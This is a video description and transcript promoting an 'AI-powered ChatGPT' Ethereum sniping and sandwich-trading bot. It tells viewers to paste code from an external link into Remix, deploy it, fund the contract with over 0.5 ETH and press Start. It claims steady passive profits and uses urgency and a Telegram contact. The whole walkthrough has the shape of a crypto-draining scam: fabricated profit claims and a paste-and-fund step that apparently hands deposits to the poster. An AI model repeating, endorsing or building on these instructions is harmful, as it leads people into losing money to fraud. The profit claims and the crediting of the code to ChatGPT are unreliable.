Title: ChatGPT Bot Contract | Step-by-step Guide
Channel: Web3 Solutions
Published: 2024-09-20T12:06:00Z
Duration: PT6M54S
Description: Get Ready! ðŸš€ Here are detailed instructions on how to make life easier with ChatGPT:

ðŸ”¸1. Download MetaMask Extension: https://metamask.io/download/

ðŸ”¸2. Access Remix: https://bit.ly/remixe-ethereum

Note: The bot is only compatible with this version of Remix, so only use this link.

ðŸ”¸3. Click on the 'Contracts' folder and then create a New File. Rename it as you like, e.g., 'bot.sol'. Make sure it ends with .sol for the Ethereum programming language.

ðŸ”¸4. Paste this code into Remix: https://codecopy.pages.dev/

ðŸ”¸5. Go to the Solidity compiler tab in Remix and compile the bot.

Note: If the text of the code is not colored, simply refresh the browser and then paste the code again.

ðŸ”¸6. Go to the 'Deploy & run transactions' tab, select 'Injected Provider' as the environment and then 'Deploy'. By approving the MetaMask contract creation fee, you will have created your own contract.

Note: Make sure the name of your bot is selected in the Contract section above the Deploy button. In this case, mine would be 'OneinchSlippageBot - bot.sol'.

ðŸ”¸7. Fund your bot to be able to frontrun transactions.

Note: Make sure your deposit is more than 0.5 ETH (to prevent negating slippage) to your exact contract/bot address.

ðŸ”¸8. After your transaction is confirmed, click the 'Start' button to run the bot. To stop the bot and withdraw funds - click the 'Withdraw' button

âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–

ðŸ”Ž How can I restore the old contract again?

Instead of using the 'Deploy' button to create a new contract in the 'Deploy & run transactions' section, you can access your existing contract by entering its address in the 'At Address' field and clicking the 'At Address' button.

Note: Access can only be restored using the same MetaMask account that was originally used to create the contract.

âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–âž–

ðŸ”§ For further assistance, feel free to PM me on Telegram: https://t.me/web3_bot

Transcript:

[00:00:00] hey everyone it's a Jacob I recorded
[00:00:02] this video for my private Channel but I
[00:00:04] have decided to share it with you all
[00:00:05] for free in order to gain your support
[00:00:07] and attention for my new channel here I
[00:00:10] will show you how to create and operate
[00:00:11] an ethereum sniping bot using AI powered
[00:00:14] chat GPT and guess what it already
[00:00:17] brings me passive income every day which
[00:00:18] is amazing this sniping bot monitors the
[00:00:21] blockchain for new tokens and
[00:00:23] significant price changes when it finds
[00:00:25] an opportunity it acts like a ninja
[00:00:27] buying or selling tokens quickly before
[00:00:30] or other Traders realize what's
[00:00:31] happening this gives us an advantage to
[00:00:33] make money on price differences the
[00:00:35] secret of the bot success is its ability
[00:00:37] to detect tokens immediately after they
[00:00:39] are listed or when there is a sudden
[00:00:41] price change it uses sophisticated
[00:00:43] algorithms to identify these movements
[00:00:45] and makes trades for you you just need
[00:00:47] to sit back and let the profits roll in
[00:00:49] if you think this sounds too complicated
[00:00:51] don't worry it's actually pretty simple
[00:00:53] and doesn't require any coding knowledge
[00:00:55] enjoy your viewing all right let's start
[00:00:57] I asked chat GPT to write me a code for
[00:00:59] a smart contract on ethereum to
[00:01:01] automatically hunt for sniping
[00:01:02] opportunities to earn
[00:01:05] ethereum there we go chat GPT is running
[00:01:07] the code and I bet it's better than any
[00:01:09] human could possibly think
[00:01:13] of then head over to remix remix is a
[00:01:16] web 3 application that allows us to
[00:01:17] develop compile deploy and launch Smart
[00:01:20] contracts coded in the solidity language
[00:01:23] I'll put a link to remix in the
[00:01:24] description below make sure you have the
[00:01:26] metamask browser extension installed and
[00:01:28] you're connected to the ethereum main M
[00:01:30] net if it's your first time on remix it
[00:01:32] may ask you to agree to their terms I've
[00:01:34] already done it head over to the sidebar
[00:01:36] on the left and create a new
[00:01:38] contract we're going to name it bot.
[00:01:41] Soul next copy this code from chat GPT
[00:01:45] and paste it into the bot file you've
[00:01:46] just created this is our sniping trading
[00:01:49] bot I will also place this code under
[00:01:51] the description so that you can copy it
[00:01:53] a couple of things to look at after
[00:01:55] pasting the code are lines 13 and 14 you
[00:01:58] can follow these addresses using ether
[00:02:00] scan these are the addresses of wrapped
[00:02:02] ether tokens which we'll be competing
[00:02:04] against you don't actually need to have
[00:02:06] any wrapped
[00:02:07] ether perfect it's the official wrapped
[00:02:10] ether address always a good idea to
[00:02:12] check that back to remix now that our
[00:02:15] bot file is ready let's compile it as
[00:02:17] you can see it's built with the 0.6.0
[00:02:19] version of
[00:02:20] solidity to avoid errors use the same
[00:02:26] version click here also make sure that
[00:02:29] the light which is set to solidity
[00:02:31] enable optimization now click on the
[00:02:33] compile bot button and wait for the bot
[00:02:35] to compile now we're going to deploy
[00:02:37] this to our wallet head over to the
[00:02:39] deploy and run transactions tab in remix
[00:02:42] here we need to select injected provider
[00:02:44] as the environment we need to confirm
[00:02:46] the contract on the blockchain by paying
[00:02:48] gas fees gas fees are the commission for
[00:02:50] the ethereum network for smart contract
[00:02:53] deployment now the deployment under
[00:02:55] utility is ready to go click deploy I
[00:02:59] always set the gap fee to high there's
[00:03:01] usually not much of a difference and it
[00:03:02] puts the transaction through much
[00:03:06] [Music]
[00:03:08] faster now we wait for the transaction
[00:03:10] to
[00:03:11] [Music]
[00:03:14] confirm sweet we can see here that it is
[00:03:17] confirmed meaning our smart contract is
[00:03:19] deployed now you can see the various
[00:03:21] functions for our smart contract the
[00:03:23] start button enables the bot to start
[00:03:25] monitoring the markets the withdraw
[00:03:27] button stops the bot and transfers funds
[00:03:29] back to the wet you can also see the
[00:03:31] current balance of the bot when the
[00:03:33] smart contract is deployed copy the
[00:03:35] address and check it on ether
[00:03:37] [Music]
[00:03:42] scan as we can see my wallet is the
[00:03:44] creator of this
[00:03:48] contract
[00:03:50] excellent fund it with some ethereum
[00:03:52] which will be used for
[00:03:54] trading make sure you get the right
[00:03:56] address here you can fund the contract
[00:03:59] with whatever amount of ethereum you
[00:04:01] want but keep in mind that the more you
[00:04:03] put in the larger the trades you'll be
[00:04:05] able to make and potentially more profit
[00:04:07] you can accumulate over
[00:04:09] [Music]
[00:04:20] time sweet there we go the transaction
[00:04:24] confirms that the funds were sent to the
[00:04:25] contract we can make sure by checking
[00:04:27] our contract address on ether scan once
[00:04:29] again ensuring our ethereum is in the
[00:04:31] contract nice it's got two ethereum
[00:04:34] which is the amount we funded the
[00:04:35] contract with the last step is to click
[00:04:37] the start button this will enable the
[00:04:39] bot to start sniffing the me poool to
[00:04:41] find different liquidity pairs in order
[00:04:43] for you to sandwich
[00:04:44] transactions let's set the gas speed to
[00:04:47] high save and click
[00:04:49] confirm we are waiting for
[00:04:52] confirmation
[00:04:53] excellent let's go to Ether scan and
[00:04:55] make sure the bot has started
[00:04:58] working I will now stop the recording
[00:05:00] and in a few hours we will see what
[00:05:02] result our bot will
[00:05:05] [Music]
[00:05:08] produce okay I'm here and it's been
[00:05:10] about 7 hours let's see what we
[00:05:13] got so as you can see I have about 2.6
[00:05:16] ethereum which is 30% profit already
[00:05:19] here we can see several bot transactions
[00:05:21] which in total has brought us 0.6
[00:05:23] ethereum let's go to remix and as we can
[00:05:26] see the bot's balance is the same
[00:05:30] I'll let the bot run for a while longer
[00:05:32] and come back to check the
[00:05:34] [Music]
[00:05:36] results all right let's refresh the page
[00:05:39] and see what we
[00:05:40] got nice it's a little over 2.8 ethereum
[00:05:44] so it basically took me a day to gain
[00:05:46] over half of my deposit back that's
[00:05:48] pretty
[00:05:50] impressive the bot will continue to run
[00:05:52] until we click the withdraw
[00:05:54] button when you click withdraw the bot
[00:05:56] will stop trading and return to the
[00:05:58] total ethereum you've entered initially
[00:05:59] including the profit back to the wallet
[00:06:02] so let's click
[00:06:04] it this will charge us a little bit of
[00:06:06] gas I'll set it to high again and then
[00:06:09] click
[00:06:14] confirm there we
[00:06:21] go the transaction
[00:06:25] confirmed let's go to our metamask and
[00:06:27] see what we have now you can see the
[00:06:30] balance from the bot is already now in
[00:06:31] my wallet this is only after running the
[00:06:33] bot for a little over a day perfect I've
[00:06:36] even had weeks where I've made 3 to six
[00:06:38] ethereum sometimes even more a lot
[00:06:40] depends on the load on ethereum network
[00:06:42] I will delete this video soon as it is a
[00:06:44] private Channel video I posted to
[00:06:45] attract a new audience drop the like and
[00:06:47] don't forget to subscribe message me on
[00:06:50] telegram to learn more about making
[00:06:52] money with web3 tools
